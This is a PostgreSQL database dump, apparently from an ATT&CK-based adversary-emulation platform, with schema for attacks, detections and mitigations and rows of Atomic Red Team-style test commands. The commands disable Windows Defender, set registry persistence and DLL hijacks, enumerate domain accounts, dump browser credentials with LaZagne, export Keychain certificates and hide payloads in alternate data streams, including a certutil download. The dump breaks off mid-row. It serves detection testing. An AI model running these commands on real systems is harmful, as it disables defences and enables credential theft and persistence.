--
-- PostgreSQL database dump
--

-- Dumped from database version 13.4 (Debian 13.4-4.pgdg110+1)
-- Dumped by pg_dump version 13.4 (Debian 13.4-4.pgdg110+1)

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

--
-- Name: attacks_attack_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.attacks_attack_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.attacks_attack_id_seq OWNER TO postgres;

SET default_tablespace = '';

SET default_table_access_method = heap;

--
-- Name: attacks; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.attacks (
    attack_id integer DEFAULT nextval('public.attacks_attack_id_seq'::regclass) NOT NULL,
    pre_requisite text,
    file_name text,
    script_type text,
    support text,
    comment text,
    color text,
    modify_date timestamp with time zone,
    sub_technique_id text,
    script jsonb
);


ALTER TABLE public.attacks OWNER TO postgres;

--
-- Name: auth_group; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.auth_group (
    id integer NOT NULL,
    name character varying(150) NOT NULL
);


ALTER TABLE public.auth_group OWNER TO postgres;

--
-- Name: auth_group_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.auth_group_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.auth_group_id_seq OWNER TO postgres;

--
-- Name: auth_group_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.auth_group_id_seq OWNED BY public.auth_group.id;


--
-- Name: auth_group_permissions; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.auth_group_permissions (
    id integer NOT NULL,
    group_id integer NOT NULL,
    permission_id integer NOT NULL
);


ALTER TABLE public.auth_group_permissions OWNER TO postgres;

--
-- Name: auth_group_permissions_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.auth_group_permissions_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.auth_group_permissions_id_seq OWNER TO postgres;

--
-- Name: auth_group_permissions_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.auth_group_permissions_id_seq OWNED BY public.auth_group_permissions.id;


--
-- Name: auth_permission; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.auth_permission (
    id integer NOT NULL,
    name character varying(255) NOT NULL,
    content_type_id integer NOT NULL,
    codename character varying(100) NOT NULL
);


ALTER TABLE public.auth_permission OWNER TO postgres;

--
-- Name: auth_permission_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.auth_permission_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.auth_permission_id_seq OWNER TO postgres;

--
-- Name: auth_permission_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.auth_permission_id_seq OWNED BY public.auth_permission.id;


--
-- Name: auth_user; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.auth_user (
    id integer NOT NULL,
    password character varying(128) NOT NULL,
    last_login timestamp with time zone,
    is_superuser boolean NOT NULL,
    username character varying(150) NOT NULL,
    first_name character varying(150) NOT NULL,
    last_name character varying(150) NOT NULL,
    email character varying(254) NOT NULL,
    is_staff boolean NOT NULL,
    is_active boolean NOT NULL,
    date_joined timestamp with time zone NOT NULL
);


ALTER TABLE public.auth_user OWNER TO postgres;

--
-- Name: auth_user_groups; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.auth_user_groups (
    id integer NOT NULL,
    user_id integer NOT NULL,
    group_id integer NOT NULL
);


ALTER TABLE public.auth_user_groups OWNER TO postgres;

--
-- Name: auth_user_groups_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.auth_user_groups_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.auth_user_groups_id_seq OWNER TO postgres;

--
-- Name: auth_user_groups_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.auth_user_groups_id_seq OWNED BY public.auth_user_groups.id;


--
-- Name: auth_user_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.auth_user_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.auth_user_id_seq OWNER TO postgres;

--
-- Name: auth_user_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.auth_user_id_seq OWNED BY public.auth_user.id;


--
-- Name: auth_user_user_permissions; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.auth_user_user_permissions (
    id integer NOT NULL,
    user_id integer NOT NULL,
    permission_id integer NOT NULL
);


ALTER TABLE public.auth_user_user_permissions OWNER TO postgres;

--
-- Name: auth_user_user_permissions_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.auth_user_user_permissions_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.auth_user_user_permissions_id_seq OWNER TO postgres;

--
-- Name: auth_user_user_permissions_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.auth_user_user_permissions_id_seq OWNED BY public.auth_user_user_permissions.id;


--
-- Name: detection; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.detection (
    detection_id integer NOT NULL,
    support character varying(20),
    script_type text,
    comment text,
    color character varying(20),
    data_source text,
    attributes json,
    sub_technique_id character varying(20),
    script jsonb,
    modify_date timestamp with time zone
);


ALTER TABLE public.detection OWNER TO postgres;

--
-- Name: detection_detection_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.detection_detection_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.detection_detection_id_seq OWNER TO postgres;

--
-- Name: detection_detection_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.detection_detection_id_seq OWNED BY public.detection.detection_id;


--
-- Name: django_admin_log; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.django_admin_log (
    id integer NOT NULL,
    action_time timestamp with time zone NOT NULL,
    object_id text,
    object_repr character varying(200) NOT NULL,
    action_flag smallint NOT NULL,
    change_message text NOT NULL,
    content_type_id integer,
    user_id integer NOT NULL,
    CONSTRAINT django_admin_log_action_flag_check CHECK ((action_flag >= 0))
);


ALTER TABLE public.django_admin_log OWNER TO postgres;

--
-- Name: django_admin_log_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.django_admin_log_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.django_admin_log_id_seq OWNER TO postgres;

--
-- Name: django_admin_log_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.django_admin_log_id_seq OWNED BY public.django_admin_log.id;


--
-- Name: django_content_type; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.django_content_type (
    id integer NOT NULL,
    app_label character varying(100) NOT NULL,
    model character varying(100) NOT NULL
);


ALTER TABLE public.django_content_type OWNER TO postgres;

--
-- Name: django_content_type_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.django_content_type_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.django_content_type_id_seq OWNER TO postgres;

--
-- Name: django_content_type_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.django_content_type_id_seq OWNED BY public.django_content_type.id;


--
-- Name: django_migrations; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.django_migrations (
    id integer NOT NULL,
    app character varying(255) NOT NULL,
    name character varying(255) NOT NULL,
    applied timestamp with time zone NOT NULL
);


ALTER TABLE public.django_migrations OWNER TO postgres;

--
-- Name: django_migrations_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.django_migrations_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.django_migrations_id_seq OWNER TO postgres;

--
-- Name: django_migrations_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.django_migrations_id_seq OWNED BY public.django_migrations.id;


--
-- Name: django_session; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.django_session (
    session_key character varying(40) NOT NULL,
    session_data text NOT NULL,
    expire_date timestamp with time zone NOT NULL
);


ALTER TABLE public.django_session OWNER TO postgres;

--
-- Name: mitigation; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.mitigation (
    mitigate_id character varying(20) NOT NULL,
    mitigate_name character varying(100) NOT NULL,
    description character varying(5000),
    support character varying(50),
    brief_info character varying(3000),
    color character varying(20)
);


ALTER TABLE public.mitigation OWNER TO postgres;

--
-- Name: old_techniques; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.old_techniques (
    technique_id character varying(20) NOT NULL,
    technique_name character varying(100) NOT NULL,
    sub_technique_id character varying(20) NOT NULL,
    sub_technique_name character varying(100),
    tactic_id character varying(20) NOT NULL,
    color character varying(10),
    support character varying(20)
);


ALTER TABLE public.old_techniques OWNER TO postgres;

--
-- Name: tactic; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.tactic (
    tactic_id character varying(20) NOT NULL,
    tactic_name character varying(25) NOT NULL
);


ALTER TABLE public.tactic OWNER TO postgres;

--
-- Name: technique; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.technique (
    technique_id character varying(20) NOT NULL,
    technique_name character varying(100) NOT NULL,
    sub_technique_id character varying(20),
    sub_technique_name character varying(100),
    combine_tech_id character varying(20) NOT NULL,
    tactic_id character varying(50) NOT NULL,
    color character varying(10),
    data_source character varying(900),
    os_type text,
    mitre_version text
);


ALTER TABLE public.technique OWNER TO postgres;

--
-- Name: technique_attack; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.technique_attack (
    combine_tech_id character varying(10) NOT NULL,
    attack_id integer NOT NULL,
    id integer NOT NULL
);


ALTER TABLE public.technique_attack OWNER TO postgres;

--
-- Name: technique_attack_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.technique_attack_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.technique_attack_id_seq OWNER TO postgres;

--
-- Name: technique_attack_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.technique_attack_id_seq OWNED BY public.technique_attack.id;


--
-- Name: technique_mitigation; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.technique_mitigation (
    combine_tech_id character varying(10) NOT NULL,
    mitigate_id character varying(20) NOT NULL,
    id integer NOT NULL
);


ALTER TABLE public.technique_mitigation OWNER TO postgres;

--
-- Name: technique_mitigation_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.technique_mitigation_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.technique_mitigation_id_seq OWNER TO postgres;

--
-- Name: technique_mitigation_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.technique_mitigation_id_seq OWNED BY public.technique_mitigation.id;


--
-- Name: auth_group id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.auth_group ALTER COLUMN id SET DEFAULT nextval('public.auth_group_id_seq'::regclass);


--
-- Name: auth_group_permissions id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.auth_group_permissions ALTER COLUMN id SET DEFAULT nextval('public.auth_group_permissions_id_seq'::regclass);


--
-- Name: auth_permission id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.auth_permission ALTER COLUMN id SET DEFAULT nextval('public.auth_permission_id_seq'::regclass);


--
-- Name: auth_user id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.auth_user ALTER COLUMN id SET DEFAULT nextval('public.auth_user_id_seq'::regclass);


--
-- Name: auth_user_groups id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.auth_user_groups ALTER COLUMN id SET DEFAULT nextval('public.auth_user_groups_id_seq'::regclass);


--
-- Name: auth_user_user_permissions id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.auth_user_user_permissions ALTER COLUMN id SET DEFAULT nextval('public.auth_user_user_permissions_id_seq'::regclass);


--
-- Name: detection detection_id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.detection ALTER COLUMN detection_id SET DEFAULT nextval('public.detection_detection_id_seq'::regclass);


--
-- Name: django_admin_log id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.django_admin_log ALTER COLUMN id SET DEFAULT nextval('public.django_admin_log_id_seq'::regclass);


--
-- Name: django_content_type id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.django_content_type ALTER COLUMN id SET DEFAULT nextval('public.django_content_type_id_seq'::regclass);


--
-- Name: django_migrations id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.django_migrations ALTER COLUMN id SET DEFAULT nextval('public.django_migrations_id_seq'::regclass);


--
-- Name: technique_attack id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.technique_attack ALTER COLUMN id SET DEFAULT nextval('public.technique_attack_id_seq'::regclass);


--
-- Name: technique_mitigation id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.technique_mitigation ALTER COLUMN id SET DEFAULT nextval('public.technique_mitigation_id_seq'::regclass);


--
-- Data for Name: attacks; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.attacks (attack_id, pre_requisite, file_name, script_type, support, comment, color, modify_date, sub_technique_id, script) FROM stdin;
17	\N		bat	yes	\N	\N	2021-07-02 09:34:00.298044+00	T1562.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["cmd.exe /c C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe Set-MpPreference -DisableBehaviorMonitoring $false 2>&1\\ncmd.exe /c C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true 2>&1"], "executor": ["cmd"], "platform": "", "file_name": "Lazarus_T1562_001.bat", "platforms": "Windows", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.299Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
36	\N		reg	yes	\N	\N	2021-07-02 09:37:17.593241+00	T1546.009	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["Windows Registry Editor Version 5.00\\n\\n[HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\AppCertDLLs]\\n\\"_appcert\\"=\\"appcert.dll\\"\\n\\n[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows]\\n\\"AppInit_DLLs\\"=\\"%APPDATA%\\\\Intel\\\\ResN32.dll\\"\\n"], "executor": [""], "platform": "", "file_name": "T1546_009_010.reg", "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.514Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
38	\N		reg	yes	\N	\N	2021-07-02 09:38:17.222631+00	T1546.012	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["Windows Registry Editor Version 5.00\\n\\n[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\winword.exe]\\n\\"Debugger\\"=\\"c:\\\\\\\\Test.exe\\""], "executor": [""], "platform": "", "file_name": "T1546_012.reg", "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.526Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
41	\N		reg	yes	\N	\N	2021-07-02 09:38:44.375767+00	T1553.003	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["Windows Registry Editor Version 5.00\\n\\n[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Cryptography\\\\OID\\\\EncodingType 0\\\\CryptSIPDllGetSignedDataMsg\\\\{0AC5DF4B-CE07-4DE2-B76E-23C839A09FD1}]\\n\\"Dll\\"=\\"C:\\\\\\\\Windows\\\\\\\\malicious.dll\\"\\n"], "executor": [""], "platform": "", "file_name": "T1553_003.reg", "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.538Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
328	\N	\N	\N	yes		\N	2021-08-30 13:07:58.678432+00	T1087.002	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "NA", "command": ["net user /domain\\nnet group /domain\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Enumerate all accounts (Domain)", "created_date": "30/08/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["net user /domain\\nget-localgroupmember -group Users\\nget-aduser -filter *\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Enumerate all accounts via PowerShell (Domain)", "created_date": "30/08/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["query user /SERVER:#{computer_name}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Enumerate logged on users via CMD (Domain)", "created_date": "30/08/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "computer_name", "value": "$env:COMPUTERNAME"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{adrecon_path} -Force -ErrorAction Ignore | Out-Null\\nGet-ChildItem $env:TEMP -Recurse -Force | Where{$_.Name -Match \\"^ADRecon-Report-\\"} | Remove-Item -Force -Recurse\\n", "command": ["Invoke-Expression #{adrecon_path}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Automated AD Recon (ADRecon)", "created_date": "30/08/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{adrecon_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "adrecon_path", "value": "$env:TEMP\\\\ADRecon.ps1"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{adfind_path} -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Adfind -Listing password policy", "created_date": "30/08/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{adfind_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "adfind_path", "value": "PathToAtomicsFolder\\\\T1087.002\\\\src\\\\AdFind.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{adfind_path} -sc admincountdmp\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Adfind - Enumerate Active Directory Admins", "created_date": "30/08/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{adfind_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "adfind_path", "value": "PathToAtomicsFolder\\\\T1087.002\\\\src\\\\AdFind.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{adfind_path} -f (objectcategory=person)\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Adfind - Enumerate Active Directory User Objects", "created_date": "30/08/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{adfind_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "adfind_path", "value": "PathToAtomicsFolder\\\\T1087.002\\\\src\\\\AdFind.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{adfind_path} -sc exchaddresses\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Adfind - Enumerate Active Directory Exchange AD Objects", "created_date": "30/08/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{adfind_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "adfind_path", "value": "PathToAtomicsFolder\\\\T1087.002\\\\src\\\\AdFind.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["net user administrator /domain\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Enumerate Default Domain Admin Details (Domain)", "created_date": "30/08/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=#{uac_prop})' -Server #{domain}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Enumerate Active Directory for Unconstrained Delegation", "created_date": "30/08/2021", "post_command": [], "modified_date": "", "pre-requisite": ["Try {\\n    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null\\n    exit 0\\n}\\nCatch {\\n    exit 1\\n}\\n"], "input_arguments": [{"key": "domain", "value": "contoso.com"}, {"key": "uac_prop", "value": 524288}], "execution_status": "Pass"}]}}}}
210	\N		\N	no		\N	2021-08-30 13:52:02.016342+00	T1018	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["net view /domain"], "executor": ["cmd"], "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "", "created_date": "24/06/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
311	\N		\N	yes	P2	\N	2021-07-30 02:33:57.939874+00	T1218.004	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "Remove-Item #{file_path}\\\\Sysinternals -Force -Recurse -ErrorAction Ignore", "command": ["cd ~/Library/Cookies\\ngrep -q \\"#{search_string}\\" \\"Cookies.binarycookies\\"\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Search macOS Safari Cookies", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "search_string", "value": "coinbase"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path}\\\\Sysinternals -Force -Recurse -ErrorAction Ignore", "command": ["#{lazagne_path} browsers\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "LaZagne - Credentials from Browser", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{lazagne_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "lazagne_path", "value": "PathToAtomicsFolder\\\\T1555.003\\\\bin\\\\LaZagne.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["security -h\\nsecurity find-certificate -a -p > #{cert_export}\\nsecurity import #{cert_export} -k\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Keychain", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "cert_export", "value": "/tmp/certs.pem"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Start-Process #{powershell_command}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Hidden Window", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "powershell_command", "value": "powershell.exe -WindowStyle hidden calc.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["type C:\\\\temp\\\\evil.exe > \\"C:\\\\Program Files (x86)\\\\TeamViewer\\\\TeamViewer12_Logfile.log:evil.exe\\"\\nextrac32 #{path}\\\\procexp.cab #{path}\\\\file.txt:procexp.exe\\nfindstr /V /L W3AllLov3DonaldTrump #{path}\\\\procexp.exe > #{path}\\\\file.txt:procexp.exe\\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\\\\temp:ttt\\nmakecab #{path}\\\\autoruns.exe #{path}\\\\cabtest.txt:autoruns.cab\\nprint /D:#{path}\\\\file.txt:autoruns.exe #{path}\\\\Autoruns.exe\\nreg export HKLM\\\\SOFTWARE\\\\Microsoft\\\\Evilreg #{path}\\\\file.txt:evilreg.reg\\nregedit /E #{path}\\\\file.txt:regfile.reg HKEY_CURRENT_USER\\\\MyCustomRegKey\\nexpand \\\\\\\\webdav\\\\folder\\\\file.bat #{path}\\\\file.txt:file.bat\\nesentutl.exe /y #{path}\\\\autoruns.exe /d #{path}\\\\file.txt:autoruns.exe /o \\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Alternate Data Streams (ADS)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "path", "value": "c:\\\\ADS\\\\"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"#{ads_file_path}\\" -Force -ErrorAction Ignore\\n", "command": ["if (!(Test-Path C:\\\\Users\\\\Public\\\\Libraries\\\\yanki -PathType Container)) {\\n    New-Item -ItemType Directory -Force -Path C:\\\\Users\\\\Public\\\\Libraries\\\\yanki\\n    }\\nStart-Process -FilePath \\"$env:comspec\\" -ArgumentList \\"/c", "type", "#{payload_path}", ">", "`\\"#{ads_file_path}:#{ads_name}`\\"\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Store file in Alternate Data Stream (ADS)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "payload_path", "value": "c:\\\\windows\\\\system32\\\\cmd.exe"}, {"key": "ads_file_path", "value": "C:\\\\Users\\\\Public\\\\Libraries\\\\yanki\\\\desktop.ini"}, {"key": "ads_name", "value": "desktop.ini"}], "execution_status": "Pass"}, {"cleanup": "del #{file_name} >nul 2>&1\\n", "command": ["echo cmd /c echo \\"Shell code execution.\\"> #{file_name}:#{ads_filename}\\nfor /f \\"usebackq delims=?\\" %i in (#{file_name}:#{ads_filename}) do %i\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create ADS command prompt", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "file_name", "value": "%temp%\\\\T1564.004_has_ads_cmd.txt"}, {"key": "ads_filename", "value": "adstest.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item -Path #{file_name} -ErrorAction Ignore\\n", "command": ["echo \\"test\\" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value \\"test\\"\\nset-content -path #{file_name} -stream #{ads_filename} -value \\"test2\\"\\nset-content -path . -stream #{ads_filename} -value \\"test3\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create ADS PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{file_name}) { exit 0 } else { exit 1 }\\n"], "input_arguments": [{"key": "file_name", "value": "$env:TEMP\\\\T1564.004_has_ads_powershell.txt"}, {"key": "ads_filename", "value": "adstest.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"$env:TEMP\\\\extracted.exe\\" -ErrorAction Ignore\\n", "command": ["$macro = [System.IO.File]::ReadAllText(\\"PathToAtomicsFolder\\\\T1564\\\\src\\\\T1564-macrocode.txt\\")\\n$macro = $macro -replace \\"aREPLACEMEa\\"", " 